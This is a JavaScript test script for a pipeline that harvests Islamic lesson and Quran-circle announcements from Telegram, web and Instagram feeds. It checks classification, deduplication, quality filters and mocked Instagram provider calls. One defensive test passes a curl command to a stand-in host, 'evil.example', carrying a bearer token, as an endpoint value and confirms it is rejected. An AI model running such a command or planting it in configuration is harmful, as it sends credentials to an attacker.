#!/usr/bin/env node
/**
 * بوابات حصاد المصادر — تشغيل: node scripts/test-harvest-gates.mjs
 */
import assert from "node:assert/strict";
import { readFileSync, existsSync } from "node:fs";
import { resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { classifyType } from "./harvest/classify.mjs";
import { fingerprintSecondary, mergeOrAppend } from "./harvest/dedupe.mjs";
import { assertValidFeed, validateFeedDocument } from "./harvest/schema.mjs";
import { runHarvest } from "./harvest/run.mjs";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");

function read(rel) {
  return readFileSync(resolve(root, rel), "utf8");
}

console.log("=== dry-run fixture ===");
const dry = await runHarvest({ dryRun: true, fixture: true, verbose: false });
assert.equal(dry.stats.failed.length, 0);

console.log("=== classification ≥ 90% ===");
const samples = [
  ["درس فقه العبادات بعد المغرب", "درس"],
  ["شرح كتاب التوحيد في المسجد", "درس"],
  ["محاضرة عن السيرة النبوية", "محاضرة"],
  ["مجلس علمي بعد العشاء", "درس"],
  ["حلقة تحفيظ للنساء", "حلقة"],
  ["حلقات تسميع جزء عم", "حلقة"],
  ["مقرأة قرآن يوم الثلاثاء", "حلقة"],
  ["دورة السيرة النبوية", "دورة"],
  ["برنامج أكاديمي في الفقه", "دورة"],
  ["دبلوم علوم شرعية", "دورة"],
  ["خطبة الجمعة في المسجد الكبير", "محاضرة"],
  ["خطيب الجمعة الشيخ فلان", "محاضرة"],
  ["التسجيل مفتوح عبر forms.gle", "تسجيل"],
  ["استمارة التسجيل متاحة الآن", "تسجيل"],
  ["إعلان عام عن نشاط الجمعية", null],
  ["تذكير بموعد اللقاء غداً", "تنبيه"],
  ["لقاء علمي بعد المغرب", "درس"],
  ["مسار تعليمي في العقيدة", "دورة"],
  ["تحفيظ القرآن للنشء", "حلقة"],
  ["محاضرة شرعية مسائية", "محاضرة"],
];
let ok = 0;
for (const [text, expected] of samples) {
  if (classifyType(text) === expected) ok++;
}
const ratio = ok / samples.length;
assert.ok(ratio >= 0.9, `classification ${(ratio * 100).toFixed(0)}% < 90%`);

console.log("=== dedupe ثلاثة مصادر → بطاقة واحدة ===");
const base = {
  id: fingerprintSecondary("درس مشترك", "2026-08-22", "السالمية"),
  type: "درس",
  title_ar: "درس مشترك",
  summary_ar: "ملخص",
  sheikh: null,
  place: "السالمية",
  audience: "عام",
  starts_at: null,
  time_text: null,
  register_url: null,
  sources: [{ id: "a", name_ar: "أ", url: "https://a", post_url: "https://a/1", platform: "telegram" }],
  image_url: null,
  published_at: "2026-08-22T10:00:00.000Z",
  confidence: 0.5,
};
const cards = [structuredClone(base)];
for (const sid of ["b", "c"]) {
  mergeOrAppend(cards, {
    ...structuredClone(base),
    sources: [{ id: sid, name_ar: sid, url: `https://${sid}`, post_url: `https://${sid}/1`, platform: "instagram" }],
  });
}
assert.equal(cards.length, 1);
assert.equal(cards[0].sources.length, 3);

console.log("=== schema feed.json ===");
const feedPath = resolve(root, "public/data/lessons/feed.json");
assert.ok(existsSync(feedPath), "feed.json مفقود");
const feed = JSON.parse(readFileSync(feedPath, "utf8"));
assertValidFeed(feed);
assert.ok(feed.items.length >= 1, `feed items ${feed.items.length} < 1`);
for (const item of feed.items) {
  assert.notEqual(item.type, "إعلان", "لا يُسمح بنوع إعلان في feed");
  assert.doesNotMatch(item.title_ar, /photo by|puede ser|image may contain/i);
}

console.log("=== فشل محوّل لا يُسقط التشغيلة ===");
const broken = await runHarvest({
  dryRun: true,
  fixture: false,
  verbose: false,
});
assert.ok(Array.isArray(broken.stats.failed));

console.log("=== Instagram provider — غير مضبوط لا يفشل ===");
const prevMode = process.env.INSTAGRAM_INGEST_MODE;
const prevKey = process.env.INSTAGRAM_PROVIDER_KEY;
const prevEndpoint = process.env.INSTAGRAM_PROVIDER_ENDPOINT;
process.env.INSTAGRAM_INGEST_MODE = "provider";
delete process.env.INSTAGRAM_PROVIDER_KEY;
delete process.env.INSTAGRAM_PROVIDER_ENDPOINT;
const { getInstagramProviderStatus } = await import("./harvest/adapters/instagram-provider.mjs");
const igStatus = getInstagramProviderStatus();
assert.equal(igStatus.mode, "provider");
assert.equal(igStatus.configured, false);
assert.equal(igStatus.message, "Instagram provider is not configured.");
const noProvider = await runHarvest({ dryRun: true, fixture: false, verbose: false });
assert.equal(noProvider.stats.instagram?.message, "Instagram provider is not configured.");
if (prevMode !== undefined) process.env.INSTAGRAM_INGEST_MODE = prevMode;
else delete process.env.INSTAGRAM_INGEST_MODE;
if (prevKey !== undefined) process.env.INSTAGRAM_PROVIDER_KEY = prevKey;
if (prevEndpoint !== undefined) process.env.INSTAGRAM_PROVIDER_ENDPOINT = prevEndpoint;

console.log("=== Instagram endpoint: رابط API فقط وليس curl ===");
{
  const { normalizeProviderEndpoint, getInstagramProviderConfig, BRIGHTDATA_POSTS_DATASET_ID } =
    await import("./harvest/adapters/instagram-provider.mjs");
  assert.equal(normalizeProviderEndpoint("https://api.brightdata.com/datasets/v3").ok, true);
  assert.equal(normalizeProviderEndpoint("https://provider.example/v1").ok, false);
  assert.equal(normalizeProviderEndpoint("curl https://api.brightdata.com/x -H Authorization:Bearer leak").ok, false);
  assert.equal(normalizeProviderEndpoint("not-a-url").ok, false);
  const scrape = normalizeProviderEndpoint(
    "https://api.brightdata.com/datasets/v3/scrape?dataset_id=gd_lk5ns7kz21pck8jpis",
  );
  assert.equal(scrape.ok, true);
  assert.equal(scrape.datasetId, BRIGHTDATA_POSTS_DATASET_ID);
  assert.match(scrape.scrapeUrl, /discover_by=url/);
  assert.match(scrape.scrapeUrl, /type=discover_new/);
  assert.match(scrape.scrapeUrl, /dataset_id=gd_lk5ns7kz21pck8jpis/);
  // dataset بروفايل يُستبدل بـ Posts
  const forced = normalizeProviderEndpoint(
    "https://api.brightdata.com/datasets/v3/scrape?dataset_id=gd_l1vikfch901nx3by4",
  );
  assert.equal(forced.ok, true);
  assert.equal(forced.datasetId, BRIGHTDATA_POSTS_DATASET_ID);
  const prevEndpoint = process.env.INSTAGRAM_PROVIDER_ENDPOINT;
  const prevKey = process.env.INSTAGRAM_PROVIDER_KEY;
  process.env.INSTAGRAM_PROVIDER_KEY = "test-key";
  process.env.INSTAGRAM_PROVIDER_ENDPOINT = "curl https://evil.example -H Authorization:Bearer leak";
  const bad = getInstagramProviderConfig();
  assert.equal(bad.configured, false);
  assert.equal(bad.endpoint, "");
  assert.match(String(bad.endpointError||""), /curl|url/i);
  // لا يُعاد تخزين أمر curl في endpoint
  assert.doesNotMatch(JSON.stringify(bad), /Bearer leak/);
  if (prevEndpoint !== undefined) process.env.INSTAGRAM_PROVIDER_ENDPOINT = prevEndpoint;
  else delete process.env.INSTAGRAM_PROVIDER_ENDPOINT;
  if (prevKey !== undefined) process.env.INSTAGRAM_PROVIDER_KEY = prevKey;
  else delete process.env.INSTAGRAM_PROVIDER_KEY;
}

console.log("=== Instagram Bright Data fixture: منشور واحد عبر discover_by=url ===");
{
  const prevMode = process.env.INSTAGRAM_INGEST_MODE;
  const prevKey = process.env.INSTAGRAM_PROVIDER_KEY;
  const prevEndpoint = process.env.INSTAGRAM_PROVIDER_ENDPOINT;
  const prevMock = process.env.INSTAGRAM_PROVIDER_MOCK;
  process.env.INSTAGRAM_INGEST_MODE = "provider";
  process.env.INSTAGRAM_PROVIDER_KEY = "test-key-never-log";
  process.env.INSTAGRAM_PROVIDER_ENDPOINT =
    "https://api.brightdata.com/datasets/v3/scrape?dataset_id=gd_lk5ns7kz21pck8jpis&notify=false&include_errors=true&type=discover_new&discover_by=url";
  delete process.env.INSTAGRAM_PROVIDER_MOCK;

  // PR الحصاد قد يرفع instagram-quota.json ممتلئًا — لا نربط الاختبار بحالة الإنتاج
  const { saveInstagramQuota } = await import("./harvest/adapters/instagram-quota.mjs");
  const quotaNow = new Date();
  saveInstagramQuota({
    day: quotaNow.toISOString().slice(0, 10),
    month: quotaNow.toISOString().slice(0, 7),
    probe_count: 0,
    fetch_count: 0,
    month_count: 0,
  });

  const realFetch = globalThis.fetch;
  let sawPost = false;
  let sawDiscover = false;
  globalThis.fetch = async (url, init = {}) => {
    const u = String(url);
    assert.match(u, /api\.brightdata\.com\/datasets\/v3\/scrape/);
    assert.match(u, /discover_by=url/);
    assert.match(u, /dataset_id=gd_lk5ns7kz21pck8jpis/);
    assert.equal(init.method, "POST");
    sawDiscover = true;
    const body = JSON.parse(String(init.body || "{}"));
    assert.ok(Array.isArray(body.input));
    assert.match(body.input[0].url, /instagram\.com\/nebraas_kw/);
    assert.equal(body.input[0].num_of_posts, 1);
    assert.equal(body.input[0].post_type, "Post");
    // لا يُسرّب المفتاح في جسم الطلب
    assert.doesNotMatch(JSON.stringify(body), /test-key-never-log/);
    sawPost = true;
    return new Response(
      JSON.stringify([
        {
          account: "nebraas_kw",
          posts: [
            {
              id: "bd-fixture-1",
              shortcode: "BdFixture1",
              url: "https://www.instagram.com/p/BdFixture1/",
              caption: "درس علمي — fixture Bright Data",
              datetime: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
              image_url: null,
            },
          ],
        },
      ]),
      { status: 200, headers: { "content-type": "application/json" } },
    );
  };

  const { harvestInstagramAccount } = await import("./harvest/adapters/instagram.mjs");
  const { extractPostsFromBrightDataPayload } = await import("./harvest/adapters/instagram-provider.mjs");
  const extracted = extractPostsFromBrightDataPayload([
    { posts: [{ id: "x", url: "https://www.instagram.com/p/x/", caption: "ص", datetime: "2026-01-01T00:00:00Z" }] },
  ]);
  assert.equal(extracted.length, 1);

  const result = await harvestInstagramAccount(
    {
      id: "ig-nebraas_kw",
      platform: "instagram",
      handle: "nebraas_kw",
      enabled: true,
      trusted: true,
      autoPublish: true,
      last_seen_post_id: null,
      last_seen_post_url: null,
    },
    { persistQuota: false },
  );
  assert.equal(sawDiscover, true);
  assert.equal(sawPost, true);
  assert.equal(result.status, "new_post");
  assert.equal(result.items.length, 1);
  assert.match(result.items[0].text, /fixture Bright Data/);

  // 404 → skipped_provider_404 دون رمي
  globalThis.fetch = async () =>
    new Response("{}", { status: 404, headers: { "content-type": "application/json" } });
  const skipped = await harvestInstagramAccount(
    {
      id: "ig-nebraas_kw",
      platform: "instagram",
      handle: "nebraas_kw",
      enabled: true,
      trusted: true,
      autoPublish: true,
    },
    { persistQuota: false },
  );
  assert.equal(skipped.status, "skipped_provider_404");
  assert.equal(skipped.items.length, 0);

  globalThis.fetch = realFetch;
  if (prevMode !== undefined) process.env.INSTAGRAM_INGEST_MODE = prevMode;
  else delete process.env.INSTAGRAM_INGEST_MODE;
  if (prevKey !== undefined) process.env.INSTAGRAM_PROVIDER_KEY = prevKey;
  else delete process.env.INSTAGRAM_PROVIDER_KEY;
  if (prevEndpoint !== undefined) process.env.INSTAGRAM_PROVIDER_ENDPOINT = prevEndpoint;
  else delete process.env.INSTAGRAM_PROVIDER_ENDPOINT;
  if (prevMock !== undefined) process.env.INSTAGRAM_PROVIDER_MOCK = prevMock;
  else delete process.env.INSTAGRAM_PROVIDER_MOCK;
}

console.log("=== Instagram provider mock ===");
process.env.INSTAGRAM_INGEST_MODE = "provider";
process.env.INSTAGRAM_PROVIDER_KEY = "test-key";
process.env.INSTAGRAM_PROVIDER_ENDPOINT = "https://api.brightdata.com/datasets/v3";
process.env.INSTAGRAM_PROVIDER_MOCK = "1";
const { fetchViaProvider } = await import("./harvest/adapters/instagram-provider.mjs");
const mockItems = await fetchViaProvider(
  { id: "ig-test", platform: "instagram", handle: "test_handle", enabled: true },
  new Date(0),
);
assert.ok(mockItems.length >= 1);
assert.ok(mockItems[0].text.includes("درس"));
delete process.env.INSTAGRAM_PROVIDER_MOCK;
delete process.env.INSTAGRAM_PROVIDER_KEY;
delete process.env.INSTAGRAM_PROVIDER_ENDPOINT;
if (prevMode !== undefined) process.env.INSTAGRAM_INGEST_MODE = prevMode;
else delete process.env.INSTAGRAM_INGEST_MODE;

console.log("=== Telegram/Web adapters موجودان ===");
const { ADAPTERS } = await import("./harvest/adapters/index.mjs");
assert.ok(typeof ADAPTERS.telegram.fetch === "function");
assert.ok(typeof ADAPTERS.web.fetch === "function");
assert.ok(typeof ADAPTERS.instagram.fetch === "function");

console.log("=== accounts.json ===");
const accounts = JSON.parse(readFileSync(resolve(root, "public/data/sources/accounts.json"), "utf8"));
assert.ok(accounts.accounts.length >= 55, `accounts ${accounts.accounts.length}`);
const keys = new Set(accounts.accounts.map((a) => `${a.platform}:${a.handle}`));
assert.equal(keys.size, accounts.accounts.length);
for (const a of accounts.accounts) {
  assert.equal(typeof a.trusted, "boolean", `${a.id} trusted`);
  assert.equal(typeof a.autoPublish, "boolean", `${a.id} autoPublish`);
}

console.log("=== تقرير الحصاد في مسار safe:content ===");
assert.match(
  read("scripts/harvest/run.mjs"),
  /public\/data\/sources\/harvest-report\.json/,
);
assert.doesNotMatch(read("scripts/harvest/run.mjs"), /appendHarvestReport|docs\/HARVEST_REPORT\.md/);

console.log("=== UI hooks ===");
assert.match(read("src/pages/lessons/ui/LessonsView.tsx"), /HarvestFeedPanel/);
assert.match(read("src/components/lessons/SourceItemCard.tsx"), /المصدر/);
assert.match(read("src/App.tsx") + "\n" + read("src/AppRoutes.tsx"), /SourcesDirectoryPage/);
assert.doesNotMatch(read("src/components/lessons/SourceItemCard.tsx"), /إعلان/);

console.log("=== qualityGate: منشور قديم بلا موعد ===");
{
  const { qualityGate } = await import("./harvest/quality-gate.mjs");
  const old = qualityGate({
    text: "درس فقه بعد المغرب في مسجد الصباحية",
    publishedAt: "2021-03-10T12:00:00.000Z",
    type: "درس",
    now: new Date("2026-08-24T12:00:00.000Z"),
  });
  assert.equal(old.ok, false);
  assert.equal(old.reason, "too_old");
}

console.log("=== qualityGate: قديم لكن موعد تسجيل مستقبلي ===");
{
  const { qualityGate } = await import("./harvest/quality-gate.mjs");
  const future = qualityGate({
    text: "دورة علمية — التسجيل مفتوح — يبدأ 15 سبتمبر 2026 — forms.gle/x",
    publishedAt: "2021-01-01T00:00:00.000Z",
    type: "تسجيل",
    now: new Date("2026-08-24T12:00:00.000Z"),
  });
  assert.equal(future.ok, true);
  assert.equal(future.type, "تسجيل");
}

console.log("=== qualityGate: Photo by / Puede ser ===");
{
  const { qualityGate } = await import("./harvest/quality-gate.mjs");
  const weak1 = qualityGate({
    text: "Photo by Ahmed on Instagram. Puede ser una imagen de texto",
    publishedAt: "2026-08-24T10:00:00.000Z",
    type: "درس",
    now: new Date("2026-08-24T12:00:00.000Z"),
  });
  assert.equal(weak1.ok, false);
  assert.equal(weak1.reason, "weak_title");
}

console.log("=== qualityGate: عنوان عربي نظيف ===");
{
  const { qualityGate, extractArabicTitle } = await import("./harvest/quality-gate.mjs");
  const title = extractArabicTitle("حلقة تحفيظ قرآن للنساء — بعد العصر — مسجد الدرر");
  assert.match(title, /حلقة تحفيظ/);
  const ok = qualityGate({
    text: "حلقة تحفيظ قرآن للنساء — بعد العصر — مسجد الدرر",
    publishedAt: "2026-08-23T10:00:00.000Z",
    type: "حلقة",
    now: new Date("2026-08-24T12:00:00.000Z"),
  });
  assert.equal(ok.ok, true);
  assert.equal(ok.title_ar, title);
}

console.log("=== qualityGate: بدون نوع مفيد ===");
{
  const { qualityGate } = await import("./harvest/quality-gate.mjs");
  const generic = qualityGate({
    text: "نشاط عام للجمعية الخيرية بدون درس محدد",
    publishedAt: "2026-08-24T10:00:00.000Z",
    now: new Date("2026-08-24T12:00:00.000Z"),
  });
  assert.equal(generic.ok, false);
  assert.equal(generic.reason, "no_useful_type");
}

console.log("=== qualityGate: تاريخ Photo by قديم ===");
{
  const { qualityGate, parseCaptionPublishedDate } = await import("./harvest/quality-gate.mjs");
  const cap = parseCaptionPublishedDate(
    "جانب من افتتاح حلقات دار ترتيل Photo by @qetaa_quran on February 11, 2024.",
  );
  assert.ok(cap?.startsWith("2024-02-11"));
  const old = qualityGate({
    text: "جانب من افتتاح حلقات دار ترتيل للفصل الدراسي الثاني Photo by @qetaa_quran on February 11, 2024.",
    publishedAt: "2026-08-24T16:05:27.496Z",
    now: new Date("2026-08-24T12:00:00.000Z"),
  });
  assert.equal(old.ok, false);
  assert.equal(old.reason, "too_old");
}

console.log("=== qualityGate: تعازي لا يُنشر ===");
{
  const { qualityGate } = await import("./harvest/quality-gate.mjs");
  const condolence = qualityGate({
    text: "يتقدم رئيس مجلس إدارة الجمعية بخالص العزاء وصادق المواساة في وفاة والده المغفور له",
    publishedAt: "2026-08-24T10:00:00.000Z",
    now: new Date("2026-08-24T12:00:00.000Z"),
  });
  assert.equal(condolence.ok, false);
  assert.equal(condolence.reason, "no_useful_type");
}

console.log("=== Instagram probe: unchanged لا يغيّر feed ===");
{
  const prevMode = process.env.INSTAGRAM_INGEST_MODE;
  const prevKey = process.env.INSTAGRAM_PROVIDER_KEY;
  const prevEndpoint = process.env.INSTAGRAM_PROVIDER_ENDPOINT;
  const prevMock = process.env.INSTAGRAM_PROVIDER_MOCK;
  const prevLatest = process.env.INSTAGRAM_MOCK_LATEST_ID;
  process.env.INSTAGRAM_INGEST_MODE = "provider";
  process.env.INSTAGRAM_PROVIDER_KEY = "test-key";
  process.env.INSTAGRAM_PROVIDER_ENDPOINT = "https://api.brightdata.com/datasets/v3";
  process.env.INSTAGRAM_PROVIDER_MOCK = "1";
  process.env.INSTAGRAM_MOCK_LATEST_ID = "mock-nebraas_kw-1";

  const { harvestInstagramAccount } = await import("./harvest/adapters/instagram.mjs");
  const unchangedAcc = {
    id: "ig-nebraas_kw",
    platform: "instagram",
    handle: "nebraas_kw",
    enabled: true,
    trusted: true,
    autoPublish: true,
    last_seen_post_id: "mock-nebraas_kw-1",
    last_seen_post_url: "https://www.instagram.com/p/mock-nebraas_kw-1/",
  };
  const unchanged = await harvestInstagramAccount(unchangedAcc, { persistQuota: false });
  assert.equal(unchanged.status, "unchanged");
  assert.equal(unchanged.items.length, 0);

  console.log("=== Instagram probe: منشور جديد → بطاقة واحدة ===");
  process.env.INSTAGRAM_MOCK_LATEST_ID = "mock-nebraas_kw-NEW";
  const freshAcc = {
    ...unchangedAcc,
    last_seen_post_id: "mock-nebraas_kw-1",
    last_seen_post_url: "https://www.instagram.com/p/mock-nebraas_kw-1/",
  };
  const fresh = await harvestInstagramAccount(freshAcc, { persistQuota: false });
  assert.equal(fresh.status, "new_post");
  assert.equal(fresh.items.length, 1);

  console.log("=== Instagram: نفس المنشور لا يُنشر مرتين ===");
  const again = await harvestInstagramAccount(
    {
      ...freshAcc,
      last_seen_post_id: fresh.items[0].externalId,
      last_seen_post_url: fresh.items[0].url,
    },
    { persistQuota: false },
  );
  assert.equal(again.status, "unchanged");
  assert.equal(again.items.length, 0);

  console.log("=== Instagram: تجاوز limit لا يكسر ===");
  process.env.INSTAGRAM_PROBE_DAILY_LIMIT = "0";
  const limited = await harvestInstagramAccount(freshAcc, { persistQuota: false });
  assert.equal(limited.status, "rate_limited");
  delete process.env.INSTAGRAM_PROBE_DAILY_LIMIT;

  console.log("=== dry-run لا يكتب last_seen_post_id ===");
  const beforeAccounts = JSON.parse(readFileSync(resolve(root, "public/data/sources/accounts.json"), "utf8"));
  const beforeIg = beforeAccounts.accounts.find((a) => a.platform === "instagram");
  const beforeId = beforeIg?.last_seen_post_id ?? null;
  await runHarvest({ dryRun: true, fixture: true, verbose: false });
  const afterAccounts = JSON.parse(readFileSync(resolve(root, "public/data/sources/accounts.json"), "utf8"));
  const afterIg = afterAccounts.accounts.find((a) => a.id === beforeIg.id);
  assert.equal(afterIg.last_seen_post_id ?? null, beforeId);

  console.log("=== accounts.json حقول التتبع لإنستغرام ===");
  for (const a of afterAccounts.accounts.filter((x) => x.platform === "instagram")) {
    assert.ok("last_seen_post_id" in a, `${a.id} last_seen_post_id`);
    assert.ok("last_seen_post_url" in a, `${a.id} last_seen_post_url`);
    assert.ok("last_checked_at" in a, `${a.id} last_checked_at`);
    assert.ok("last_published_at" in a, `${a.id} last_published_at`);
  }

  if (prevMode !== undefined) process.env.INSTAGRAM_INGEST_MODE = prevMode;
  else delete process.env.INSTAGRAM_INGEST_MODE;
  if (prevKey !== undefined) process.env.INSTAGRAM_PROVIDER_KEY = prevKey;
  else delete process.env.INSTAGRAM_PROVIDER_KEY;
  if (prevEndpoint !== undefined) process.env.INSTAGRAM_PROVIDER_ENDPOINT = prevEndpoint;
  else delete process.env.INSTAGRAM_PROVIDER_ENDPOINT;
  if (prevMock !== undefined) process.env.INSTAGRAM_PROVIDER_MOCK = prevMock;
  else delete process.env.INSTAGRAM_PROVIDER_MOCK;
  if (prevLatest !== undefined) process.env.INSTAGRAM_MOCK_LATEST_ID = prevLatest;
  else delete process.env.INSTAGRAM_MOCK_LATEST_ID;
}


console.log("test-harvest-gates.mjs: ok");
